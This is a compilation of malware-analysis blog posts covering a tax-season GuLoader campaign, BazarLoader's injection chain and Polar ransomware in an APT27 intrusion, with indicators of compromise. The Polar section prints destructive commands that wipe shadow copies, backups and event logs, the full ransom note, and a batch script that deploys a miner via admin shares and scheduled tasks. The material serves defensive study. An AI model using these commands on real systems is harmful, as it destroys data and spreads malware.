We found 29 different varieties of the VBS and 90 other encrypted and unencrypted payloads hosted in these locations.
There may be others. 
A heavily obfuscated VBS 
The initial infector is a Visual Basic script, heavily obfuscated, and very large at more than 200KB in size.
A block of base64-encoded, encrypted data comprises almost 150KB of that script, along with code that decodes and decrypts the block of base64. 
The VBS contains two large variables.
In the script we analyzed, these were named Ir8 and O7, respectively, but although the variable names were slightly modified in each variant of the script we examined, the overall flow was the same.
These work in tandem to insert data into the Windows Registry and execute PowerShell commands. 
When decoded, the content of the Ir8 variable (a segment of which is shown below) turns out to be just another encoded PowerShell script, which the VBS decodes and then executes. 
The PowerShell script decoded from the Ir8 variable uses Reflection.
Assembly to load the final payload into memory from a Registry value without writing it to disk.
The script (shown in part, below) converts several small strings to bytes, concatenates the output, performs a BXOR to decode the bytes, and then converts those bytes to ASCII text, before executing them. 
And the content loaded out of the Registry?
That’s what comes from the O7 variable (shown in part, below, because it is too large to fit on one screenshot).
The concatenated segments of base64 data from O7 get inserted into the Registry, for the Ir8 script to decode. 
Post-infection, the machine will have an instance of an otherwise benign Windows binary running.
On one machine, we found that the malware injected itself, using process hollowing, into ielowutil.exe, used by the now defunct Internet Explorer browser for tuning the microphone settings in the browser.
But the malware doesn’t exclusively inject its code into this exe; Other now-defunct Internet Explorer components were also observed being abused by the malware, including ieinstal.exe (the tool that installs Add-Ons into Internet Explorer). 
The malware makes several other changes to Windows settings during the infection process.
It creates a User-level Environment Variable (in our test case, this was called SaltoQ), which points at the full path to the PowerShell executable on the system. 
It created a Run key in the Registry named Overproduce that invokes the SaltoQ variable to run a PowerShell command at every reboot. 
And that Run key references a different Registry key, in HKEY_CURRENT_USER\Cloglike that contains a portion of the same Visual Basic Script code that was in the original .vbs payload the malware downloads during the infection process. 
Once infected, the ielowutil.exe binary constantly attempts to contact its command–and-control server, on 64.44.101.171:9191.
During our attempts to infect machines with the malware, that C2 server failed to respond.
However, we did infect a test machine with other samples from this attack, and some of those were successful at connecting to C2 servers at 84.21.172.49:1040 (ironic port number!)
and 185.225.74.91:2080.
Both of those C2s were live as of publication of this blog. 
We also detected the infected computer repeatedly attempting to resolve the address of the domain newmansubzero.com, which is the 64.44.
address above. 
Guidance and detection Tax preparers and accountants are extremely busy at the best of times, but during US tax season, which culminates in mid-April, they are the busiest they will be all year.
Harried CPAs from firms of all sizes must be wary that they are targets for criminals who would love nothing more than the sensitive financial data they receive in abundance at this time of year. 
The attack method in this case takes advantage of the frenetic pace of tax season and uses a social engineering tactic to smooth the way for the malware to be delivered via email.
As such, it’s very prudent to be cautious when you’re approached by potential new clients.
Ask them if they will speak to you on the phone directly, who referred them to you, and if they’d be willing to come in for an in-person evaluation. 
Most of all, be very wary of people who send you a Dropbox link to a password-protected Zip file at any time of year.
When the Zip file is password protected, it can make the contents un-scannable by endpoint security tools.
If they provide a password, unzip the file and then scan the contents with an endpoint security tool before opening them. 
The PDF icon used for the Shortcut in the attack is also distinctive and unique.
The icon, which doesn’t resemble the icon used by any known PDF reader application, looks like an icon for a plain text document wrapped in a red bar with the white letters PDF inside. 
It’s also notable that the icon does have the little arrow in the bottom left corner that indicates it is a Shortcut, and not a document.
It’s possible a busy accountant may not notice that detail. 
When in doubt, you can also right-click (not left-click) the icon, one click only, and choose Properties.
Even though the Properties sheet won’t display the Powershell command, if the file is a Shortcut it will have a Shortcut tab (normal document files won’t have those) and it accurately shows that the “Target type” is a Visual Basic Script (VBScript Script File).
Hovering the mouse pointer over the Shortcut icon causes the malicious shortcut to display the information pushed into the Comment field, which makes it appear that the document is in fact a PDF when it is not. 
If you still suspect things are not as they should be, ask the potential customer to call you on the phone before you open the files.
The attackers, in this case, seemed to limit their communication to email. 
Sophos products detect various aspects of the attack quite comprehensively: Endpoint will detect the shortcut file as Troj/LnkObf-T or Mal/DownLnk-D and the VBS payload of the shortcut as VBS/Inject-IPG.
Some payload samples may be detected as Behaviorally, it detects the injection techniques used by the attackers as Evade_34a or Evade_34b.
GuLoader code in memory also will be detected as Mem/Guload-A. Our network security products will block communication to the IP addresses used to host the payloads and the C2 addresses. 
Indicators of compromise relating to this attacker and their tooling are hosted on the Sophos X-Ops Github. 
Acknowledgments Sophos X-Ops wishes to acknowledge the contributions of Colin Cowie and Benjamin Sollman of the MDR intelligence team, Sivagnanam Gn, Anand Ajjan, and Anisha Kumar of SophosLabs, and Sales Engineer Matthew Haltom to our understanding of this threat and its impacts. 
title: BazarLoader Mocks Researchers in December 2020 Malspam Campaign url: https://www.gosecure.net/blog/2021/02/01/bazarloader-mocks-researchers-in-december-2020-malspam-campaign/ BazarLoader Mocks Researchers in December 2020 Malspam Campaign by Lilly Chalupowski | Feb 1, 2021 Our Inbox Detection and Response (IDR) team has observed a new BazarLoader campaign targeting the information technology, aeronautic and financial industries.
The IDR team has successfully blocked over 550 thousand BazarLoader malspam emails throughout this campaign alone. 
GoSecure researchers received a sample from the IDR team which was suspected of being BazarLoader, named Report Preview15-10.exe, on 2020-10-06.
Shortly after, GoSecure researchers received yet another BazarLoader sample on 2020-10-08 named Document2-85.exe, which exhibited similar behavior. 
The initial infection vector, which has been observed by our Inbox Detection and Response Team (IDR), is via malspam containing fake employment termination notices and anonymous surveys.
The threat actor(s) primarily use Google Drive and Google Docs to distribute their malicious payloads.
The employment termination malspam was observed on October 6, 2020 and the anonymous survey malspam was observed on October 8, 2020.
This can be seen in Figure 1 and Figure 2. Figure 1: BazarLoader Employment Termination Malspam Figure 2: BazarLoader Fake Anonymous Survey We will firstly analyze the employment termination malspam. 
Once the user clicks the link, they will be redirected tohxxps://docs[.]google[.]com/document/d/e/2PACX-1vR_9tGGWDcS1ZyIuiGpMQg2Sv9nRWempyUKuQ1iyJp_HHt1C87OPirnO7EImnOW6ILbrmHXUpl_OIxQ/pub to download an executable. 
The executable Review_Report15-10.exe (3c27fca6d9cf1379eee93e6fea339e61) will appear as a PDF document to users who do not have extensions enabled in Windows, as seen in Figure 3. Figure 3: Stage 1 PDF Icon Lure To help obfuscate its purpose, BazarLoader appears to be bound or obfuscated with legitimate resources from YUVPlayer (A Lightweight YUV player which supports various YUV formats).
An example of this can be seen in Figure 4. Figure 4: YUVPlayer Dialog Embedded Resource Once executed, the legitimate application or dialogs will not be shown to the user.
Instead, it will call advapi32.CryptHashData using the string s_)q03vcOm95^+Rj3dG_Jx@k0GGwYOIddH_14025b520 as the data to create a hash using the PROV_RSA_FULL Windows cryptographic provider.
Once the hash is created, it will create a key using advapi32.CryptDeriveKey. 
It will then obtain a handle to the current process for the purpose of allocating memory with PAGE_EXECUTE_READWRITE permissions. 
The next function is responsible for copying the shellcode from the .data section to the newly allocated memory location.
Once the encrypted shellcode has been copied to executable memory, it will then use advapi32.CryptEncrypt to decrypt the shellcode.
Once the shellcode has been successfully decrypted, it will execute the shellcode. 
Figure 5: BazarLoader Shellcode Decryption Routine Figure 6: Executing Stage 1 Decrypted Shellcode 
The shellcode will obtain a handle to kernel32.LoadLibraryA, kernel32.GetProcAddress, kernel32.VirtualAlloc, kernel32.VirtualProtect and ntdll.
ZwFlushInstructionCache, by enumerating the Process Environment Block (PEB) using the instruction mov rax,qword ptr gs: [60]. 
This is common with shellcode as it will need to resolve these APIs dynamically to interact with the Windows operating system. 
Once completed, it will then call kernel32.VirtualALloc to prepare injecting a PE executable for the next stage.
To build the PE header, it will use the routine shown in Figure 7. Figure 7: Prepare Stage 2 PE Once PE header has been partially copied (excluding MZ magic value), it will start to copy the .text section using the routine shown in Figure 8. Figure 8: Copy .text
Section Once the .text section is copied, it will start resolving many different Windows APIs using kernel32.GetProcAddress. 
When the additional APIs have been resolved, it will then make the .text section it copied earlier executable using kernel32.VirtualProtect, as seen in Figure 9. Figure 9: Make .text Section Executable NOTE:
On different debugging sessions the virtual addressing changed during analysis. 
Interestingly, the Portable Executable (PE) BazarLoader is copied into memory (without the MZ header) and will start execution at the end of the .text section using a direct call.
This can make unpacking the next stage confusing for reverse engineers as this is not where code in a PE file is supposed to begin.
This code at the end of the .text section is solely responsible for making a call to the real Original Entrypoint (OEP) of the PE.
It is important to note that this is simply used as shellcode and not as a PE in memory.
The other benefit of this technique is no calls to thread related APIs are required, making it more challenging for Endpoint Detection and Response (EDR) solutions to detect.
This can be seen in Figure 10. Figure 10: OEP Shellcode/PE Trickery After the previous trickery in the new memory space, it will start creating another PE in memory, but this time the header does start with the MZ magic value.
After building the headers, it will copy each PE section one at a time, as seen in Figure 11. Figure 11:
Building .text Section for Stage 2 Once the PE has been extracted to memory, it will make a direct call instead of using Threading APIs (same trickery as before).
This can be seen in Figure 12. 
Figure 12: Calling Stage 2 Shellcode BazarLoader’s stage 2 shellcode will make use of encrypted stack strings for many purposes throughout the rest of its code. 
Before it continues with its malicious activity, it will check if the locale is Armenian (0x2b).
Interestingly, instead of shutting down gracefully when the Armenian locale is detected, it will execute a jmp instruction to an invalid address, causing an access violation exception.
We have seen Russian crimeware checking for the Armenian keyboard layout previously in malware such as KPot, we hypothesize this could be similar behavior. 
To avoid running more than one instance of itself, BazarLoader will create a mutex with a hard-coded UUID, then use kernel32.GetLastError to check for the error ERROR_ALREADY_EXISTS.
If the mutex already exists, it will exit the process.
The call to kernel32.CreateMutexA can be seen in Figure 13. Figure 13: Mutex Creation Interestingly, BazarLoader will check for mutexes twice. 
Once completed, it will decyrpt its C2 configuration, as seen in Figure 14. Figure 14: BazarLoader Stage 2 Decrypted Downloader Config 
Once BazarLoader has determined the Armenian language is not being used and another instance of itself is not running, it will make a HTTP HEAD request to hxxps://titlecs[.]com.
It will continue to do this until it receives a 200 response from the C2 server.
The first request will be sent using wininet.
HttpSendRequestA, as seen in Figure 15. Figure 15: HTTP HEAD Request 
It is important to note that the HTTP header Update is not a standard header and can be considered anomalous. 
This HEAD request can be seen in Figure 16. 
Figure 16: BazarLoader C2 Download Domain HEAD Request 
The C2 server will respond with a 200 OK message. 
BazarLoader will also check if it is connected to the internet by making a request to microsoft[.]com, as seen in Figure 17. Figure 17: BazarLoader Internet Connectivity Check Once completed, it will make a POST request to the second domain in its configuration, as seen in Figure 18. Figure 18: BazarLoader C2 Checkin Once completed, it will make a HTTP GET request in order to obtain the next stage, as seen in Figure 19. Figure 19:
BazarLoader Downloading Encrypted Payload Differences Between Versions There are a few notable differences between the first version of BazarLoader sent on 2020-10-06 (Employment Termination Malspam) and the one sent on 2020-10-08 (Survey Malspam).
The main difference between the two versions is the malware author(s) now include the string Stupid Defender to mock researchers, the shellcode that was stored in the .data section is now stored in the .rsc section, the functionality to get a pointer to the encrypted shellcode and to decrypt it have been broken out into their own separate functions.
This can be seen in Figures 20 and 21. Figure 20: Updated Main Shellcode Decryption/Execution Routine Figure 21: Obtain Encrypted Pointer to Encrypted Shellcode from the Resource Section Figure 22:
Encrypted Shellcode in Resource Section BazarLoader is becoming increasingly popular amongst threat actors.
We suspect the reason behind the malware developer(s) success is their use of techniques such as avoiding the use of threading APIs and faking PE injection, when in reality, it is simply shellcode injection.
These techniques are likely used to confuse Endpoint Detection and Response (EDR) solutions. 
Indicator Description hxxps://titlecs[.]com/issues/284 BazarLoader Encrypted Payload URL hxxps://titlecs[.]com/issues/282 BazarLoader Encrypted Payload URL hxxp://ds46x1[.]com/1/run BazarLoader Encrypted Payload URL labelcs[.]com BazarLoader C2 Domain (Employment Termination Malspam) 
mixcinc[.]com BazarLoader C2 Domain (Employment Termination Malspam) 
nicknamec[.]com BazarLoader C2 Domain (Employment Termination Malspam) 3c27fca6d9cf1379eee93e6fea339e61 BazarLoader Shellcode Injector (Preview15-10.exe) 3ee60e0efeb5b349a5ba7325ce4a33dc BazarLoader Shellcode Injector (Document2-85.exe) hxxps://docs[.]google[.]com/document/d/e/2PACX- 1vR_9tGGWDcS1ZyIuiGpMQg2Sv9nRWempyUKuQ1iyJp_HHt1C87OPirnO7EImnOW6ILbrmHXUpl_OIxQ/p Employment Termination Malspam Payload URL hxxps://docs[.]google[.]com/document/d/e/2PACX- 1vQ7wK9C0fLCwS3voYLhGz3Gmy6g4UMKe_xZ1ds8xv7LonpviJBXefG9rBZuMPkmtytDYe_5rbDztBnK/pub Survey Malspam Payload URL ds45x1[.]com BazarLoader C2 Domain (Survey Malspam) ds46x1[.]com BazarLoader C2 Domain (Survey Malspam) ds47x1[.]com BazarLoader C2 Domain (Survey Malspam) marcene[.]jack[at]peytoneley[.]com BazarLoader Malspam Email shannon[.]ong35[at]myhunter[.]cuny[.]edu BazarLoader Malspam BazarLoader Malspam Email bessie[.]wilson[at]griply[.]com BazarLoader Malspam Email Lilly Chalupowski Paul Neuman 
title: Investigation with a twist: an accidental APT attack and averted data destruction url: https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ In late April 2020, a client invited the CSIRT incident response team at the Positive Technologies Expert Security Center (PT ESC) to investigate a network compromise that resulted in encryption of files on servers and employee workstations. 
We initially assumed that this was yet another attack on corporate networks with a common variety of ransomware.
However, what we found was different: this intrusion was the work of a well-known Asian APT group implicated in cyberespionage against government targets.
The initial successful compromise had taken place two years prior. 
In this article, we will share the results of our investigation of this targeted attack, which started with the compromise of a foreign office.
Ultimately, we succeeded in bringing the infrastructure back to a secure condition and reversing the damage that had been done. 
Sequence of events Mass encryption of files on the client's infrastructure and a ransom demand formed the starting point of the investigation.
A large number of damaged files is itself a very visible attack indicator that enabled detecting the intrusion.
Retrospective analysis showed that the client's infrastructure had been compromised not three or four days before (or even a few hours before, as often happens in mass attacks), but in early 2018.
What's more, the initial infection was of a foreign office of the client.
Then a subsequent breach of the head office back home. 
We believe that the initial entry point to the foreign office's network was a vulnerable server on the network perimeter.
Exploitation in February 2018 enabled the attackers to gain initial access and then persistence, with the help of the ChinaChopper and TwoFace web shells. 
The attackers used NBTScan for network reconnaissance and PsExec for lateral movement.
They obtained credentials for pivoting with Mimikatz.
In some cases, we were able to detect memory dumps of the lsass process that had been archived and uploaded.
Because use of Mimikatz was likely blocked by endpoint security software, the attackers were forced to run bruteforcing offline.
Another method was to scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer.
On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdoors were installed for reliable persistence and access. 
One unexpected result of the compromise was cryptocurrency mining at both the foreign office and headquarters.
Such activity remained unnoticed for one and a half years.
During this time the attackers only maintained their access abilities by periodically obtaining new accounts or building tunnel chains.
Our belief is that by early 2020, the attackers had lost their access (for reasons unknown to us).
We can see use of web shells on the foreign office's servers on February 9, 2020.
Subsequent actions were very similar to what had happened two years earlier.
By using the tools already described, the attackers obtained the credentials of a domain administration at headquarters.
This time, they deleted OS logs and stopped Shadow Copy services, complicating subsequent incident analysis. 
For the finale, on April 29, 2020, the account of the compromised domain admin was used to push Polar ransomware to computers and run it, encrypting user files and demanding a ransom.
While our specialists were assisting the client in May 2020, the attackers made yet another attempt to regain control of infrastructure with the help of web shells that were still in place on the network of the headquarters and office, but this time to no success. 
Here we have provided a timeline to better show the sequence of events. 
CSIRT's objectives included recovering the client's data, which included key information belonging to different departments.
We performed analysis of the encryption malware and were able to recover the lost files. 
Polar ransomware 
The method used to run the ransomware is classic and, indeed, characteristic of certain Asian groups.
Three files are sent to the victim's computer: 
GDFInstall.exe (MD5: 13435101240f78367123ef01a938c560) is a legitimate computer game component signed by Ubisoft. 
GameuxInstallHelper.dll (MD5: 1fd8402275d42e7389f0d28b9537db0f) is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run. 
This component is not actually legitimate, however: attacker code is executed after the GameExplorerInstallW symbol is exported.
This frequently used technique of loading malicious code in the context of a legitimate application is known as DLL hijacking. 
The file c:\programdata\Sysurl.
Hex is read (after being copied from c:\windows\system32\Sysurl.
Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFFSDJJHGYUOIj.
The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.
The payload and intermediate library are deleted before completion.
Deletion occurs in the standard (insecure) way, which enables recovering the data if disk access is stopped in time and the information has not been overwritten. 
Sysurl.
Hex is an encrypted copy of the Polar ransomware. 
This payload call sequence (in which a legitimate application loads a malicious library, which in turn decrypts a third component and passes control to it) is very commonly used to run the PlugX backdoor, which is widely seen among such Asian APT groups as APT10, APT41, TA459, and Bronze Union. 
Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834deee241b) in greater detail. 
Based on how GameuxInstallHelper.dll is launched, we quickly can guess that this file, too, is an executable file compiled with .NET.
The compilation date is April 9, 2020.
The code entry point is the Actions method of the Encode class in the Polar name space (which is the name we have used for the malware family). 
The malware deletes system event logs and shadow copies by performing the following commands: dism /online /enable-feature /featurename:NetFx3 vssadmin.exe Delete Shadows /All
/Quiet bcdedit /set {default} recoveryenabled no wmic shadowcopy delete wbadmin delete backup wbadmin delete systemstatebackup -keepversions:0 bcdedit /set {default} bootstatuspolicy ignoreallfailures bcdedit /set {default} recoveryenabled no wevtutil.exe clear-log Application wevtutil.exe clear-log Security wevtutil.exe clear-log System wbadmin delete catalog -quiet wbadmin delete catalog -quiet wbadmin delete systemstatebackup 
It then looks for and stops the following processes: agntsvc.exe agntsvc.exe agntsvc.exe agntsvc.exe dbeng50.exe dbsnmp.exe encsvc.exe excel.exe firefoxconfig.exe infopath.exe isqlplussvc.exe msaccess.exe msftesql.exe mspub.exe mydesktopqos.exe mydesktopservice.exe mysqld-nt.exe mysqld-opt.exe mysqld.exe notepad++.exe notepad.exe ocautoupds.exe ocomm.exe ocssd.exe onenote.exe oracle.exe outlook.exe powerpnt.exe sqbcoreservice.exe sqlagent.exe sqlbrowser.exe sqlservr.exe sqlwriter.exe steam.exe synctime.exe tbirdconfig.exe thebat.exe thebat64.exe thunderbird.exe visio.exe winword.exe wordpad.exe xfssvccon.exe Then the malware gets a list of connected disks and starts recursive traversal of directories, skipping a few of them: C:\Windows C:\Program Files C:\Program Files (x86) C:\ProgramData C:\Python $SysReset $Recycle.
Bin $RECYCLE.BIN It cares only about files with the following extensions: .3dm .3ds .3g2 .3gp .7z .accdb .ai .aif 
.asf .asp .aspx .avi .bak .bin .bmp 
.c .cbr .cer .cfm .class .cpp .crdownload .cs .csr .css .csv .cue .dat .db 
.dbf .dds 
.deb 
.dmg .dmp .doc .docx .dtd .dwg 
.dxf .eps .fla .flv 
.ged .gif .gz 
.h .html .ics .iff .indd .ini .iso .java .jpg 
.js 
.jsp .key .keychain .log .lua 
.m 
.m3u .m4a .m4v .max .mdb 
.mdf 
.mid .mov .mp3 .mp4 
.mpa 
.mpg .msg .msi .obj .odt .pages .part .pct .pdb 
.pdf .php 
.pkg .pl .png 
.pps .ppt .pptx .ps .psd .py .rar .rm 
.rpm .rss .rtf 
.sdf .sh .sitx .sln .sql .srt .svg .swf .swift .tar .tar.gz .tax2014 .tax2015 .tex .tga .thm .tif .tiff .tmp .toast .torrent .txt .vb .vcd .vcf .vcxproj .vob .wav .wma 
.wmv 
.wpd .wps .xcodeproj .xhtml .xlr .xls .xlsx .xml 
.yuv .zip .zipx Before starting encryption, the malware creates what we will call a base encryption key consisting of eight randomly chosen characters from the following alphabet: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/ Two approaches to encryption are used, depending on the file size.
Each approach involves a different encryption key.
The base encryption key is used in both approaches, however. 
First we will look at the approach for encryption of files with size less than 64,052,000 bytes (approximately 61 MB).
The intermediate password is the SHA-256 hash sum of the base encryption key.
It is identical for all files and is used with a hard-coded salt and 1,000 iterations to generate the encryption key and initialization vector.
Each key is encrypted with AES-CBC.
The .locked extension is added to encrypted files. 
Larger files are encrypted in a different way.
In this case, the 16-byte encryption key is formed by taking the first 8 bytes from the base encryption key and the remaining 8 bytes from an additional hard-coded array.
This is followed by a custom implementation of AES-ECB.
Blocks of 16 bytes are encrypted, with the next 12,800 bytes skipped.
The result is that only small parts of the file—not the entire file—are encrypted.
This method was likely to chosen to speed up the encryption process.
Encrypted files have the .cryptd extension. 
Note that the result is creation of a new file (where the encrypted stream is written).
The original file is insecurely deleted.
Therefore, the original files can also be recovered from unallocated disk space if they have not yet been overwritten with fresh information. 
In each directory containing encrypted files, a file named readme_contact_alex.dali@iran.ir.htm is created with the following contents: Your companies cyber defense systems have been weighed, measured and have been found wanting!!! 
The breach is a result of grave neglect of security protocols All of your computers have been corrupted with Polar malware that has encrypted your files. 
We ensure that the only way to retrieve your data swiftly and securely is with our software. 
Restoration of your data requires a private key which only we possess Don't waste your time and money purchasing third party software, without the private key they are useless. 
It is critical that you don't restart or shutdown your computer. 
This may lead to irreversible damage to your data and you may not be able to turn your computer back on. 
To confirm that our software works email to us 2 files from random computers you will get them decrypted. 
readme_contact_alex.dali@iran.ir.htm contain encrypted session keys we need in order to be able to decrypt your files. 
The softwares price will include a guarantee that your company will never be inconvenienced by us. 
You will also receive a consultation on how to improve your companies cyber security If you want to purchase our software to restore your data contact us at: Pt34Jarmys@protonmail.com alex.dali@iran.ir We can only show you the door.
You're the one who has to walk through it. 
Your personal installation key:*REDACTED* The text of the ransom demand resembles that used by MegaCortex ransomware. 
The ransom demand contains a modified version of the base encryption key.
This version is derived by encrypting the base encryption key with RSA (with a hard-coded 1024-byte public key) and encoding it in Base64. 
After file encryption is completed, the malware writes an image (contained in executable file resources) to disk at the path c:\programdata\Rs.bmp and sets it as the desktop background. 
The malware subsequently repeats the same procedure for deleting system event logs and shadow copies that it performed at the start.
Then it sends an HTTP POST request with the name of the victim's computer to a server at hxxp://www.therockbrazil.com.br/assinaturas/logs.php. 
How we decrypted the files Readers following the chain of encryption steps have likely noticed that the security of this whole encryption system depends on what we have called the base encryption key.
Its value is encrypted with RSA-1024 and placed in the ransom demand.
Currently, there are no methods that are both cheap and fast for factoring a key of such size.
So we tried another tactic. 
Remember that the base key is generated by taking eight random characters from the alphabet quoted earlier.
Here is how the implementation works: The Random function is called once, without any arguments.
This call returns a random number, the seed for pseudorandom generation of which is taken from the value of the Environment.
TickCount variable.
This variable is 4 bytes and stores the number of milliseconds since the operating system started. 
So to decode the files, all we need to know is the uptime (how long the computer has been turned on) as of when the ransomware ran.
But how simple is it to calculate? 
Most of the affected computers had not only been disconnected from the corporate network, but turned off for analysis of the hard drive contents.
Due to this, the uptime of the computers could not be known.
The operating system logs contain timestamps for shutdown and power on.
But in this case, the ransomware destroys these logs twice.
So we were unable to find any clues pointing at possible values of uptime on the affected computers themselves. 
Fortunately, however, SCCM was used on the client infrastructure, with client-side agents running on all the encrypted computers.
The information we needed was stored centrally and had not been tampered with: all we needed was some trial-and-error to choose the right values. 
Now that we had relatively precise uptime values, we needed to determine when the ransomware had run.
Remember that at the end, the malware deletes the intermediate DLL library and encrypted ransomware, but not the legitimate executable file whose process is used for performing the malicious actions.
In other words, the time at which this file appeared on the system should be the approximate time when the ransomware ran, to within several seconds.
We succeeded in bruteforcing the exact value of the base encryption key in about a minute on an ordinary workstation (on the order of a few tens of thousands of iterations).
We could then decrypt the remaining files.
In a few cases, we had a tougher time bruteforcing the key at first.
The reason was that the timezones had been set incorrectly.
With this realization, we were able to conquer this issue as well. 
Attribution We mentioned the SysUpdate and HyperBro backdoors from the attackers' toolkit.
These are somewhat esoteric Remote Access Trojans used by the APT27 group (also known as Bronze Union, LuckyMouse, Emissary Panda, or Iron Tiger).
The group likely has Asian roots, with activity since at least 2010.
The group focuses its attention on government targets in the defense and energy industries, as well as aerospace and manufacturing.
Most commonly, the original attack vector is a compromise of the victim's web servers by exploiting vulnerabilities, bruteforcing credentials, or taking advantage of web server misconfigurations.
Despite the similarities in tactics, techniques, and procedures (TTPs) and use of a telltale toolkit, some of the team's researchers are skeptical about attribution of the attacks to APT27. 
1.
Choice of target Media companies had never been of interest for APT27.
This is consistent with the findings of our incident investigation: the attackers did not try to access private information on the target infrastructure, instead only running software for direct financial gain. 
2.
Cryptocurrency mining and ransomware 
This is atypical and, moreover, ill-suited software that can quickly attract attention and wreck any plans for long-term cyberspying.
The URL address to which the ransomware "phones home" upon completing its work does not have anything in common with APT27 network infrastructure.
Of course, some groups (such as Lazarus and Winnti) combine cyberspying with direct financial motivations, so perhaps APT27 is broadening its previously limited range of interests.
Or, as an alternative, the group has reached an agreement with other attackers for use of their software in return for a part of the proceeds.
In favor of attribution of Polar to APT27, we can note the sequence of payload, execution, and naming: the encrypted SysUpdate backdoor is often named sys.bin.url and the Polar ransomware was named Sysurl.
Hex, in a rather similar way.
However, this could also be a false flag. 
3. Automation in 2018 and 2020 Here is the script used to automatically install a cryptocurrency miner on a list of computers in 2018: @echo off for /f
%%i in (c:\programdata\list.txt) do ( net use \\%%i\c$ "*" /u:*\administrator copy c:\programdata\vmnat.exe \\%%i\c$\windows\system32\vmnat.exe SCHTASKS /Create /S
%%
i /u
*\administrator /p "*" /tn
* /tr "cmd.exe /c start c:\windows\system32\vmnat.exe" /sc
onstart /RU SYSTEM schtasks /run
/S
*\administrator /p "*" /tn * net use \\%%i\c$ /del net use * /del /Y ) del vmnat.exe del list.txt del work.bat 
And this is the script used to automatically delete the ransomware from a list of computers in 2020: @echo off for /f
%%i in (c:\programdata\list.txt) do ( net use \\%%i\c$ "*" /u:*\* if not errorlevel 1 ( del \\%%i\c$\programdata\GameuxInstallHelper.dll del \\%%i\c$\programdata\GDFInstall.exe del \\%%i\c$\programdata\Sysurl.
Hex net use \\%%i\c$ /del )ELSE ( echo not access %%
i >>
c:\programdata\no_access.txt ) ) (We replaced sensitive information with '*') 
The scripts show certain similarities in structure and have the same loop of file lines at the same path.
On the other hand, the indentation, script tasks, and file naming are different.
Some of the commands are too general to tell, since they could have been found in online search results and reused. 
4.
Bodies of the SysUpdate and HyperBro backdoors We were not able in some cases to confirm the presence of a given backdoor based on the body of the Trojan itself.
We identified the HyperBro backdoor, which had been used in 2018, based on the distinctive file name combined with other confirmed tools.
We confirmed the SysUpdate backdoor, used in 2020, by looking at the C2 address and backdoor body in the process dump memory that had been uploaded to VirusTotal during investigation from an organization not linked to our client. 
Taken together, these similarities certainly point to APT27 as a culprit, but are not entirely conclusive.
Therefore we leave it to the reader to choose whether to concur regarding involvement by APT27. Conclusion In this article, we have described an APT27 attack on a media company.
The cybercriminals obtained access to the company's headquarters by compromising an office in a foreign country.
They maintained control of the infrastructure for two years.
They used both publicly available and custom-developed tools that had been seen previously.
The hackers, while not changing their TTPs, chose rather unusual software to monetize their attacks.
Perhaps the compromise of this client was an accident and this was merely an attempt to obtain at least some benefit.
User data was encrypted, after which a ransom demand was made.
A mistake in the ransomware's cryptographic algorithms enabled us to recover the encrypted files.
To our knowledge, the attackers did not obtain access to information of any value whatsoever, ultimately leaving them with nothing to show for their efforts. 
Authors: Denis Goydenko and Alexey Vishnyakov, Positive Technologies MITRE TTPs Tactic ID Name Initial Access T1190 Exploit Public-Facing Application T1199 Trusted Relationship Execution T1059 Command and Scripting Interpreter:
Windows Command Shell T1053 Scheduled Task/Job: Scheduled Task T1047 Windows Management Instrumentation Persistence T1547 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1574 Hijack Execution Flow: DLL Search Order Hijacking T1053 Scheduled Task/Job: Scheduled Task T1078 Valid Accounts: Domain Accounts T1078 Valid Accounts: Default Accounts Privilege Escalation T1068 Exploitation for Privilege Escalation Defense Evasion T1140 Deobfuscate/Decode Files or Information T1070 Indicator Removal on Host: Clear Windows Event Logs T1070 Indicator Removal on Host: File Deletion T1070 Indicator Removal on Host: Timestomp Credential Access T1003 OS Credential Dumping: LSASS Memory Discovery T1087 Account Discovery: Domain Account T1082 System Information Discovery T1049 System Network Connections Discovery Lateral Movement T1210 Exploitation of Remote Services T1570 Lateral Tool Transfer T1021 Remote Services: SMB/Windows Admin Shares Collection T1560 Archive Collected Data: Archive via Utility T1005 Data from Local System T1119 Automated Collection T1039 Data from Network Shared Drive Command and Control T1071 Application Layer Protocol: Web Protocols T1132 Data Encoding: Standard Encoding T1573 Encrypted Channel:
Symmetric Cryptography Exfiltration T1020 Automated Exfiltration T1041 Exfiltration Over C2 Channel Impact T1486 Data Encrypted for Impact IOCs ChinaChopper: 2ce60073c09887f9e3a482097294e17d 5bc0d6918e03a92f04b3dfc21b619c7f 73717a2f9bfe19ccdad541bec1fa2b69 82a8470534d74c9c5c0d84071eb0a703 b89e96e2ea8dd6fdb438f7d5b8ecf60c TwoFace: 581c331d41ef5f5df99ae0d16b2cebf0 84816f2e1f321f45c15c80b5cd6b4d37 ff2693903a1049984745e79381e9ed7e SysUpdate: 3c1981991cce3b329902288bb2354728 43a2c2fb8d52dc1835ac18516b13aff1 4b5484e3de5c5a2e60fcee50d04183d6 SysUpdate C&C: 103.59.144[.]183 95.179.189[.]33 NBTScan: f01a9a2d1e31332ed36c1a4d2839f412 SMBTouch: b50fff074764b3a29a00b245e4d0c863 PsExec: aeee996fd3484f28e5cd85fe26b6bdcd Termite: dc92496358b8e67568a35b861ba1804e39e3d36b Dsquery: 3583d7c971de148a1ffb3302d1510ef1 EternalBlue: 
8c80dd97c37525927c1e549cb59bcbf3 frsocks: da0c13d834cafc010bec1afa2d76196ced71e661 Mimikatz: 449da3d7405c2c79fa55bd7973096e28 0078ff05c20689f40ea9cb8c47fcfb2e52cdc3a9 BitMiner: 5430039162e58c44f9a5941295b55fba Polar: 
841980b4ae02a4e6520ab834deee241b 
title: Threat actors strive to cause Tax Day headaches url: https://www.microsoft.com/en-us/security/blog/2023/04/13/threat-actors-strive-to-cause-tax-day-headaches/ Threat actors often take advantage of current events and major news headlines to align attacks and leverage social engineering when people could be more likely to be distracted or misled.
Tax season is particularly appealing to threat actors because not only are people busy and under stress, but it is intrinsically tied to financial information.
